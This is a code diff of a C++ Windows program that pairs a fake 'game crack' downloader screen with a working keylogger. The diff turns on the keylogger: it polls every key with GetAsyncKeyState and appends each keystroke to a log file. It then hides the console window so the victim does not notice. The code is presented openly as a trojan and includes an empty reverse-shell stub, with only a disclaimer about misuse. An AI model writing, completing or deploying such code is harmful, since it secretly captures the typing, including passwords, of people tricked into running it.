@@ -21,7 +21,9 @@ Warning: I am NOT responsible for ANY misuse of this product
 #include <winuser.h>
 #include <bits/stdc++.h>
 
+
 //Define namespace & avoid errors
+//Yes ik it's bad practice
 using namespace std; 
 
 
@@ -45,7 +47,7 @@ void Trojan(){
     printf("     \\/                     \\/            \\/     \\/      \\/              \\/     \\/    \\/     \\/  \n");
 
     printf("\n");
-    printf("Now unlocking the secret game 'It's great' \nPlease be patient... \n");
+    printf("Now downloading crack for the secret game 'Frosted Flakes' \nPlease be patient... \n");
     
     //Fake a Progress bar
     #define PROGRESS_BAR_SIZE 40
@@ -70,9 +72,8 @@ void Trojan(){
     }
     //Indicate it's done and press any key to close
     printf("\n");
-    printf("\nDone! \nPress the Enter key to close! ... ");
-    
-
+    printf("\nDone! \nThis Terminal will automatically close in a couple of seconds!\nGive it a minute to finalize the crack ... ");
+    Sleep(500);
 }
 
 
@@ -80,40 +81,26 @@ void Trojan(){
 void Keylogger(){
     #define LOG_FILE "keylogger.txt" //create log file
 
-    auto saveData = [](string data){
+    auto saveData = [](std::string data){
         fstream logFile;
 
-        logFile.open(LOG_FILE)
-    }
-
-    /*
-    //Define the function that will create and parse the keystrokes
-    auto KeyLog = [](int key_stroke, char *file){
-        //Append the keystrokes to the log file
-        FILE * OUTPUT_FILE;
-        OUTPUT_FILE = fopen(file, "a+");
-        cout << key_stroke << endl;
-
-        //Here we define how to parse special characters
-
-        fclose (OUTPUT_FILE);
+        logFile.open(LOG_FILE, std::ios::app); //open the log file and append data (std::ios::app)
+        logFile << data; //writes data into the logfile
+        logFile.close(); //close the file
     };
 
-    //------ RUN THE ACTUAL KEYLOGGER -----
-    char i;
-    //using while(true) will run an infinite loop until a break statement is issued
-    while (true) {
-        for(i = 8; i <= 190; i++) {
-            if (GetAsyncKeyState(i) == -32767){
-                KeyLog(i, "testing.txt");
+
+    while (true){ //While(true) creates an infinite loop that won't stop until it's explicitly broken
+        //this is the common code in all the keyloggers written in C
+        for(int key = 8; key <= 190; key++) {
+            if (GetAsyncKeyState(key) == -32767){
+                //once we get the key input we should verify if it's a special character
+                saveData(std::string(1, (char)std::tolower(key)));
             }
         }
     }
-    system("PAUSE");
 
-    printf("Kellog \n");
-
-    */
+    
 }
 /*################ REVERSE SHELL #####################*/
 void RevShell(){
@@ -125,8 +112,9 @@ void RevShell(){
 int main (int argc, char *argv[]){ 
      //call our functions
      Trojan();
+     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //This hides the terminal windows when run as administrator
      Keylogger();
-     RevShell();
-     //Used to keep the window open until we press the enter key
-     cin.get();
+     
+
+     
 }
